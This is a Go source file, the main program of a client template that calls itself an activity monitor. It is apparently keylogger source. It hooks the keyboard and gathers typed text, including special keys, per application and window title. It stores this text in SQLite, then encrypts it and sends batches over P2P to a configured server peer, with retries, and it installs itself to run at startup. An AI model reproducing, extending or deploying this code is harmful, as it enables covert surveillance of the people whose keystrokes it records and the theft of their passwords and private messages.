// GuiKeyStandaloneGo/generator/templates/client_template/main.go
package main

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"

	// Project's shared packages
	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/crypto" // For AES encryption for P2P payload
	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/p2p"
	"github.com/RIZAmohammadkhan/GuiKeyStandaloneGo/gui_generator_app/pkg/types" // For LogEvent, ApplicationActivity

	// External dependencies
	"github.com/google/uuid" // For parsing CfgClientID
	_ "modernc.org/sqlite"   // Pure Go SQLite driver
	// Note: "golang.org/x/sys/windows/registry" is used by autorun_windows.go
	// and "golang.org/x/sys/windows" is used by foreground_windows.go & keyboard_windows.go.
	// These are resolved because all these .go files are 'package main' and compiled together,
	// and the root go.mod should have 'golang.org/x/sys'.
)

// Global logger for the client application
var (
	clientGlobalLogger *log.Logger
)

// setupLogger initializes the file-based logger.
func setupLogger(logDir, logFile string) error {
	absLogDir := logDir
	if !filepath.IsAbs(logDir) {
		exePath, err := os.Executable()
		if err != nil {
			// Use fmt.Fprintf for critical early errors if logger isn't set up
			fmt.Fprintf(os.Stderr, "CRITICAL: Cannot get executable path for logger: %v. Using current directory for logs.\n", err)
			absLogDir = "." // Fallback
		} else {
			absLogDir = filepath.Join(filepath.Dir(exePath), logDir)
		}
	}

	if err := os.MkdirAll(absLogDir, 0755); err != nil {
		return fmt.Errorf("failed to create log directory %s: %w", absLogDir, err)
	}

	logPath := filepath.Join(absLogDir, logFile)
	file, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("failed to open log file %s: %w", logPath, err)
	}
	clientGlobalLogger = log.New(file, "CLIENT: ", log.LstdFlags|log.Lshortfile)
	// Log level from CfgInternalLogLevel is used conceptually here; a real leveled logger would apply it.
	clientGlobalLogger.Printf("Client logger initialized (Level: %s). Log file: %s", CfgInternalLogLevel, logPath)
	return nil
}

// activeSessionData holds data for the current application session.
type activeSessionData struct {
	startTime          time.Time
	pid                uint32
	applicationName    string
	initialWindowTitle string
	typedText          strings.Builder
}

// reset reinitializes the active session data.
func (s *activeSessionData) reset(start time.Time, pid uint32, appName, title string) {
	s.startTime = start
	s.pid = pid
	s.applicationName = appName
	s.initialWindowTitle = title
	s.typedText.Reset()
}

// isEmpty checks if the current session has accumulated any typed text.
func (s *activeSessionData) isEmpty() bool {
	return s.typedText.Len() == 0
}

// runEventAggregator processes raw monitoring events into structured LogEvents.
func runEventAggregator(
	appEventIn <-chan ActiveAppEvent,
	processedKeyIn <-chan ProcessedKeyEvent,
	logEventOut chan<- types.LogEvent,
	internalQuit <-chan struct{},
	logger *log.Logger,
	clientIDString string, // This is CfgClientID from generated config
	periodicFlushInterval time.Duration,
) {
	logger.Println("Event aggregator goroutine started.")

	var currentSession *activeSessionData = nil
	var clientUUID uuid.UUID
	parsedUUID, err := uuid.Parse(clientIDString) // Use the passed-in clientIDString
	if err != nil {
		logger.Printf("EVENT AGGR: CRITICAL - Invalid ClientID UUID string '%s': %v. Using zero UUID.", clientIDString, err)
		// clientUUID remains zero UUID
	} else {
		clientUUID = parsedUUID
	}

	flushTicker := time.NewTicker(periodicFlushInterval)
	defer flushTicker.Stop()

	finalizeSession := func(sessionEndTime time.Time, reason string) {
		if currentSession != nil && !currentSession.isEmpty() {
			logEntry := types.NewApplicationActivityEvent(
				clientUUID, // Use the parsed clientUUID
				currentSession.applicationName,
				currentSession.initialWindowTitle,
				currentSession.startTime,
				sessionEndTime,
				strings.TrimSpace(currentSession.typedText.String()),
			)
			logger.Printf("EVENT AGGR: Finalizing session for '%s' (Reason: %s): %d chars. Start: %s, End: %s",
				currentSession.applicationName, reason, currentSession.typedText.Len(),
				currentSession.startTime.Format(time.RFC3339), sessionEndTime.Format(time.RFC3339))

			select {
			case logEventOut <- logEntry:
				logger.Printf("EVENT AGGR: Sent LogEvent (ID: %s) for %s to cache/sync.", logEntry.ID, logEntry.ApplicationName)
			case <-time.After(2 * time.Second): // Non-blocking send with timeout
				logger.Println("EVENT AGGR: Timeout sending LogEvent to output channel. Event might be lost if channel is full and not consumed.")
			}
		}
		currentSession = nil // Reset session
	}

	for {
		select {
		case appEvent, ok := <-appEventIn:
			if !ok {
				logger.Println("EVENT AGGR: App event channel closed.")
				appEventIn = nil                                // Stop selecting on this channel
				if processedKeyIn == nil && appEventIn == nil { // Both closed, so exit
					return
				}
				continue
			}

			// Logic to decide if a new session should start
			shouldStartNewSession := false
			if appEvent.IsSwitch { // Explicit switch event from monitor
				shouldStartNewSession = true
			}
			// If no current session, but we got a valid app event
			if currentSession == nil && appEvent.Info.PID != 0 && appEvent.Info.ProcessName != "" {
				shouldStartNewSession = true
			}
			// If current session exists, but new app event has a different PID
			if currentSession != nil && appEvent.Info.PID != 0 && appEvent.Info.PID != currentSession.pid {
				logger.Printf("EVENT AGGR: Detected PID change (%d -> %d) for app '%s' -> '%s'. Forcing new session.",
					currentSession.pid, appEvent.Info.PID, currentSession.applicationName, appEvent.Info.ProcessName)
				shouldStartNewSession = true
			}

			if shouldStartNewSession {
				finalizeSession(appEvent.Timestamp, "App Switch/New App") // Finalize previous session
				// Start new session only if the new app info is valid
				if appEvent.Info.PID != 0 && appEvent.Info.ProcessName != "" {
					currentSession = &activeSessionData{} // Create new session object
					currentSession.reset(appEvent.Timestamp, appEvent.Info.PID, appEvent.Info.ProcessName, appEvent.Info.Title)
					logger.Printf("EVENT AGGR: Started new session for App: %s (PID: %d) - Title: \"%s\"",
						currentSession.applicationName, currentSession.pid, currentSession.initialWindowTitle)
				} else {
					logger.Printf("EVENT AGGR: App focus likely lost or new app info invalid (PID: %d, Name: '%s'). No active session.", appEvent.Info.PID, appEvent.Info.ProcessName)
				}
			} else if currentSession != nil && appEvent.Info.PID == currentSession.pid && appEvent.Info.Title != currentSession.initialWindowTitle {
				// Title changed for the same app, log it but don't necessarily start a new session
				// The `IsSwitch` flag from the monitor should ideally handle if this is a significant change.
				// For now, we just log it. If this should also trigger a new session, adjust logic.
				logger.Printf("EVENT AGGR: Title updated for current app '%s' (PID: %d) to \"%s\". (IsSwitch from monitor: %t)",
					currentSession.applicationName, currentSession.pid, appEvent.Info.Title, appEvent.IsSwitch)
				// Optionally update currentSession.initialWindowTitle here if needed
			}

		case pKey, ok := <-processedKeyIn:
			if !ok {
				logger.Println("EVENT AGGR: Processed key channel closed.")
				processedKeyIn = nil                            // Stop selecting on this channel
				if processedKeyIn == nil && appEventIn == nil { // Both closed, so exit
					return
				}
				continue
			}
			if currentSession == nil { // No active application session to append keys to
				// logger.Printf("EVENT AGGR: Key event received ('%s') but no active session. Ignoring.", pKey.KeyValue)
				continue
			}

			// Only append if it's a key down event to avoid double characters for key presses
			if pKey.IsKeyDown {
				textToAppend := ""
				if pKey.IsChar {
					textToAppend = pKey.KeyValue
				} else if !strings.HasPrefix(pKey.KeyValue, "[VK_") { // It's a mapped special key like [ENTER], [CTRL]
					textToAppend = pKey.KeyValue
					// Add a space after certain special keys for readability if they don't naturally produce one
					if pKey.KeyValue == "[ENTER]" || pKey.KeyValue == "[TAB]" || strings.HasPrefix(pKey.KeyValue, "[F") {
						textToAppend += " "
					}
				}
				// Else: it's an unmapped VK code like [VK_0x...], typically ignore these for typed text
				if textToAppend != "" {
					currentSession.typedText.WriteString(textToAppend)
				}
			}

		case <-flushTicker.C:
			// Periodic flush: if there's an active session with typed text, log it
			if currentSession != nil && !currentSession.isEmpty() {
				segmentEndTime := time.Now().UTC() // Use current time as end of this segment
				logEntry := types.NewApplicationActivityEvent(
					clientUUID, // Use the parsed clientUUID
					currentSession.applicationName,
					currentSession.initialWindowTitle,
					currentSession.startTime, // Original start time of this session part
					segmentEndTime,
					strings.TrimSpace(currentSession.typedText.String()),
				)
				select {
				case logEventOut <- logEntry:
					logger.Printf("EVENT AGGR: Sent periodic LogEvent (ID: %s) for '%s' to cache/sync.", logEntry.ID, logEntry.ApplicationName)
				case <-time.After(2 * time.Second):
					logger.Println("EVENT AGGR: Timeout sending periodic LogEvent. Event might be lost.")
				}
				// Reset typed text and update start time for the *next* segment of this session
				currentSession.typedText.Reset()
				currentSession.startTime = segmentEndTime
			}

		case <-internalQuit:
			logger.Println("Event aggregator goroutine stopping.")
			finalizeSession(time.Now().UTC(), "Client Shutdown") // Finalize any pending session
			return
		}
	}
}

// runSyncManager periodically attempts to send cached logs to the server.
func runSyncManager(
	logStore *LogStore,
	p2pMan *P2PManager,
	internalQuit <-chan struct{},
	wg *sync.WaitGroup,
	logger *log.Logger,
	syncInterval time.Duration,
	maxEventsPerBatch int,
	clientID string, // This is CfgClientID
	encryptionKeyHex string, // This is CfgEncryptionKeyHex
	maxRetries uint32,
	retryInterval time.Duration,
) {
	defer wg.Done()
	if syncInterval == 0 {
		logger.Println("SyncManager: Sync interval is 0, sync effectively disabled.")
		<-internalQuit // Wait for quit signal if disabled
		logger.Println("SyncManager: Shutting down (was disabled).")
		return
	}
	logger.Printf("SyncManager: Started. Sync interval: %v, Max events/batch: %d", syncInterval, maxEventsPerBatch)

	// Perform an initial sync check on startup
	logger.Println("SyncManager: Performing initial sync check on startup...")
	performSyncCycle(logStore, p2pMan, logger, maxEventsPerBatch, clientID, encryptionKeyHex, maxRetries, retryInterval, internalQuit)

	ticker := time.NewTicker(syncInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			logger.Println("SyncManager: Performing periodic sync check...")
			performSyncCycle(logStore, p2pMan, logger, maxEventsPerBatch, clientID, encryptionKeyHex, maxRetries, retryInterval, internalQuit)

		case <-internalQuit:
			logger.Println("SyncManager: Shutdown signal received. Performing final sync attempt...")
			performSyncCycle(logStore, p2pMan, logger, maxEventsPerBatch, clientID, encryptionKeyHex, maxRetries, retryInterval, internalQuit)
			logger.Println("SyncManager: Shutting down.")
			return
		}
	}
}

// performSyncCycle contains the logic for one sync attempt.
func performSyncCycle(
	logStore *LogStore,
	p2pMan *P2PManager,
	logger *log.Logger,
	maxEventsPerBatch int,
	clientID string, // This is CfgClientID
	encryptionKeyHex string, // This is CfgEncryptionKeyHex
	maxRetries uint32,
	retryInterval time.Duration,
	internalQuit <-chan struct{}, // Used to abort retries/waits if app is shutting down
) {
	eventsToSync, err := logStore.GetBatchForSync(maxEventsPerBatch)
	if err != nil {
		logger.Printf("SyncManager: Error getting batch from LogStore: %v", err)
		return
	}

	if len(eventsToSync) == 0 {
		// logger.Println("SyncManager: No events to sync.") // Can be noisy
		return
	}
	logger.Printf("SyncManager: Found %d events to sync.", len(eventsToSync))

	jsonData, err := json.Marshal(eventsToSync)
	if err != nil {
		logger.Printf("SyncManager: Error marshaling events to JSON: %v. Batch not sent.", err)
		return // Or handle more gracefully, e.g., marking events as problematic
	}

	encryptedPayload, err := crypto.Encrypt(jsonData, encryptionKeyHex)
	if err != nil {
		logger.Printf("SyncManager: Error encrypting payload: %v. Batch not sent.", err)
		return
	}
	// logger.Printf("SyncManager: Payload encrypted (%d bytes original -> %d bytes encrypted).", len(jsonData), len(encryptedPayload))

	var attempt uint32
	for attempt = 0; attempt < maxRetries; attempt++ {
		// Check for shutdown before attempting to send
		select {
		case <-internalQuit:
			logger.Println("SyncManager: Shutdown signaled during sync cycle before send. Aborting.")
			return
		default:
			// Continue with send attempt
		}

		// Context for the SendLogBatch operation itself, including connect, stream, write, read response
		sendCtx, cancelSendCtx := context.WithTimeout(context.Background(), 75*time.Second) // Overall P2P op timeout

		// Goroutine for the actual P2P send to avoid blocking the sync manager's select loop indefinitely
		sendDone := make(chan struct{})
		var response *p2p.LogBatchResponse
		var sendErr error

		go func() {
			defer close(sendDone) // Ensure sendDone is closed to unblock select
			response, sendErr = p2pMan.SendLogBatch(sendCtx, clientID, encryptedPayload)
		}()

		// Wait for SendLogBatch to complete or for shutdown signal
		select {
		case <-sendDone:
			// SendLogBatch completed (successfully or with error/timeout via sendCtx)
		case <-internalQuit:
			logger.Println("SyncManager: Shutdown signaled during P2P send. Cancelling send context.")
			cancelSendCtx() // Attempt to cancel the ongoing P2P operation
			<-sendDone      // Wait for the P2P operation goroutine to finish
			logger.Println("SyncManager: P2P send cancelled due to shutdown. Aborting sync cycle.")
			return
		}
		cancelSendCtx() // Clean up the sendCtx resources regardless of outcome

		if sendErr != nil {
			logger.Printf("SyncManager: Attempt %d/%d failed to send log batch: %v", attempt+1, maxRetries, sendErr)
			if attempt < maxRetries-1 {
				logger.Printf("SyncManager: Retrying in %v...", retryInterval)
				select {
				case <-time.After(retryInterval):
					// Continue to next attempt
				case <-internalQuit:
					logger.Println("SyncManager: Shutdown signaled during retry wait. Aborting sync.")
					return
				}
				continue
			} else {
				logger.Printf("SyncManager: Max retries (%d) reached for sending batch. Batch remains in cache.", maxRetries)
				return // Give up on this batch for now
			}
		}

		// If sendErr is nil, we got a response object (or nil if protocol implies no response on success)
		if response != nil && response.Status == "success" {
			logger.Printf("SyncManager: Batch successfully synced to server. Server processed %d of %d events.", response.EventsProcessed, len(eventsToSync))
			eventIDs := make([]uuid.UUID, len(eventsToSync))
			for i, ev := range eventsToSync {
				eventIDs[i] = ev.ID
			}
			if err := logStore.ConfirmEventsSynced(eventIDs); err != nil {
				logger.Printf("SyncManager: CRITICAL ERROR - Failed to confirm synced events in LogStore: %v. Data may be resent.", err)
				// This is a bad state; data was sent but not marked as such locally.
			}
			return // Batch successfully processed
		} else {
			// Handle server-side error or unexpected response
			errMsg := "unknown server error or nil response"
			if response != nil {
				errMsg = fmt.Sprintf("status='%s', message='%s', server_processed=%d", response.Status, response.Message, response.EventsProcessed)
			}
			logger.Printf("SyncManager: Server indicated failure for batch (Attempt %d/%d): %s.", attempt+1, maxRetries, errMsg)
			if attempt < maxRetries-1 {
				logger.Printf("SyncManager: Retrying server-indicated failure in %v...", retryInterval)
				select {
				case <-time.After(retryInterval):
					// Continue to next attempt
				case <-internalQuit:
					logger.Println("SyncManager: Shutdown signaled during retry wait. Aborting sync.")
					return
				}
				continue
			} else {
				logger.Printf("SyncManager: Max retries (%d) reached after server-indicated failure. Batch remains in cache.", maxRetries)
				return // Give up on this batch
			}
		}
	}
}

func main() {
	// Initialize logger first
	if err := setupLogger(CfgInternalLogFileDir, CfgInternalLogFileName); err != nil {
		// Fallback if logger setup fails
		fallbackLogPath := "client_critical_error.log"
		// Attempt to determine exe dir for fallback, otherwise use current dir
		if exeP, errExe := os.Executable(); errExe == nil {
			fallbackLogPath = filepath.Join(filepath.Dir(exeP), "client_critical_error.log")
		} else {
			fmt.Fprintf(os.Stderr, "CRITICAL: Cannot get executable path for fallback log: %v\n", errExe)
		}
		_ = os.WriteFile(fallbackLogPath, []byte(fmt.Sprintf("CRITICAL: Failed to setup logger: %v. Exiting.\n", err)), 0644)
		os.Exit(1) // Exit if logger cannot be initialized
	}

	clientGlobalLogger.Printf("Client Activity Monitor starting. Version: DEV. ClientID: %s", CfgClientID)
	clientGlobalLogger.Printf("Target Server PeerID: %s", CfgServerPeerID)
	clientGlobalLogger.Printf("Bootstrap Addresses: %v", CfgBootstrapAddresses)
	clientGlobalLogger.Printf("Log File Path (for SQLite DB): %s", CfgLogFilePath)
	if CfgMaxLogFileSizeMB != nil {
		clientGlobalLogger.Printf("Max Log SQLite DB Size (MB): %d", *CfgMaxLogFileSizeMB)
	} else {
		clientGlobalLogger.Println("Max Log SQLite DB Size (MB): Unlimited")
	}

	// --- Setup Autostart ---
	exePath, err := os.Executable() // Get current executable's path
	if err != nil {
		clientGlobalLogger.Printf("Autorun WARNING: Could not get executable path: %v. Autostart setup skipped.", err)
	} else {
		if err := setupAutostart(CfgAppNameForAutorun, exePath, clientGlobalLogger); err != nil {
			clientGlobalLogger.Printf("Autorun WARNING: Failed to set up autostart: %v. Continuing execution.", err)
		} else {
			// Autostart setup logged within setupAutostart function
		}
	}
	// --- End Autostart Setup ---

	// Initialize LogStore (SQLite)
	dbPath := CfgLogFilePath // Use the path from generated config
	if !filepath.IsAbs(dbPath) {
		// exePath should be valid if autostart setup didn't fatally error on it
		if exePath == "" { // Should not happen if previous block ran
			exeP, errExe := os.Executable()
			if errExe != nil {
				clientGlobalLogger.Fatalf("CRITICAL: Failed to get executable path for DB (second attempt): %v", errExe)
			}
			exePath = exeP
		}
		dbPath = filepath.Join(filepath.Dir(exePath), CfgLogFilePath)
	}

	logStore, err := NewLogStore(dbPath, clientGlobalLogger)
	if err != nil {
		clientGlobalLogger.Fatalf("CRITICAL: Failed to initialize LogStore: %v", err)
	}
	defer func() {
		if errClose := logStore.Close(); errClose != nil {
			clientGlobalLogger.Printf("Error closing LogStore: %v", errClose)
		}
	}()

	// Initialize P2PManager
	p2pMan, err := NewP2PManager(clientGlobalLogger, CfgServerPeerID, CfgBootstrapAddresses)
	if err != nil {
		clientGlobalLogger.Fatalf("CRITICAL: Failed to initialize P2PManager: %v", err)
	}
	defer p2pMan.Close()

	// --- Channels & WaitGroup for graceful shutdown ---
	osQuitChan := make(chan os.Signal, 1)
	signal.Notify(osQuitChan, syscall.SIGINT, syscall.SIGTERM)
	internalQuitChan := make(chan struct{}) // For signaling goroutines to stop
	var wg sync.WaitGroup                   // To wait for goroutines to finish

	// --- Event Channels ---
	appActivityEventChan := make(chan ActiveAppEvent, 100)
	rawKeyDataChan := make(chan RawKeyData, 256)              // Keyboard hook -> Raw Processor
	processedKeyDataChan := make(chan ProcessedKeyEvent, 256) // Raw Processor -> Aggregator
	logEventOutChan := make(chan types.LogEvent, 100)         // From aggregator to cache manager

	// --- Start Goroutines ---
	// Foreground App Monitor
	wg.Add(1)
	go func() {
		defer wg.Done()
		monitorForegroundApp(appActivityEventChan, 1*time.Second, internalQuitChan, clientGlobalLogger)
	}()
	clientGlobalLogger.Println("Foreground app monitor goroutine started.")

	// Keyboard Monitor (manages its own WaitGroup Add/Done internally for the OS-locked thread)
	startKeyboardMonitor(rawKeyDataChan, internalQuitChan, &wg, clientGlobalLogger) // Pass main wg
	clientGlobalLogger.Println("Keyboard monitor initialized (starts its own goroutines).")

	// Raw Key Event Processor
	wg.Add(1)
	go func() {
		defer wg.Done()
		processRawKeyEvents(rawKeyDataChan, processedKeyDataChan, internalQuitChan, clientGlobalLogger)
	}()
	clientGlobalLogger.Println("Raw key event processor goroutine started.")

	// Event Aggregator
	wg.Add(1)
	flushInterval := time.Duration(CfgProcessorPeriodicFlushIntervalSecs) * time.Second
	if CfgProcessorPeriodicFlushIntervalSecs == 0 { // Treat 0 as effectively disabled (very long interval)
		flushInterval = 24 * 365 * time.Hour // A year
		clientGlobalLogger.Println("Event Aggregator: Periodic flush effectively disabled (interval set to 1 year).")
	}
	go runEventAggregator(appActivityEventChan, processedKeyDataChan, logEventOutChan, internalQuitChan, clientGlobalLogger, CfgClientID, flushInterval)
	clientGlobalLogger.Println("Event aggregator goroutine started.")

	// SQLite Cache Manager
	wg.Add(1)
	go runSQLiteCacheManager(logStore, logEventOutChan, internalQuitChan, &wg, CfgLocalLogCacheRetentionDays, CfgMaxLogFileSizeMB)
	clientGlobalLogger.Println("SQLite cache manager goroutine started.")

	// P2P Manager (discovery, connections, etc.)
	wg.Add(1)
	go runP2PManager(p2pMan, internalQuitChan, &wg, clientGlobalLogger)
	clientGlobalLogger.Println("P2P manager goroutine started.")

	// Sync Manager (sends data via P2P)
	wg.Add(1)
	syncIntervalDur := time.Duration(CfgSyncIntervalSecs) * time.Second
	if CfgSyncIntervalSecs == 0 { // Treat 0 as effectively disabled
		syncIntervalDur = 24 * 365 * time.Hour
		clientGlobalLogger.Println("Sync Manager: Sync interval effectively disabled (set to 1 year).")
	}
	retryIntervalDur := time.Duration(CfgRetryIntervalOnFailSecs) * time.Second
	go runSyncManager(
		logStore, p2pMan, internalQuitChan, &wg, clientGlobalLogger,
		syncIntervalDur, CfgMaxEventsPerSyncBatch, CfgClientID,
		CfgEncryptionKeyHex, CfgMaxRetriesPerBatch, retryIntervalDur,
	)
	clientGlobalLogger.Println("Sync manager goroutine started.")

	clientGlobalLogger.Println("Client main components initialized. Waiting for shutdown signal...")
	// --- Wait for OS signal to shutdown ---
	<-osQuitChan // Block until SIGINT or SIGTERM
	clientGlobalLogger.Println("OS shutdown signal received. Signaling goroutines to stop...")
	close(internalQuitChan) // Signal all dependent goroutines to stop

	clientGlobalLogger.Println("Waiting for goroutines to complete...")
	wg.Wait() // Wait for all goroutines managed by this WaitGroup to finish

	clientGlobalLogger.Println("All client components shut down gracefully.")
}
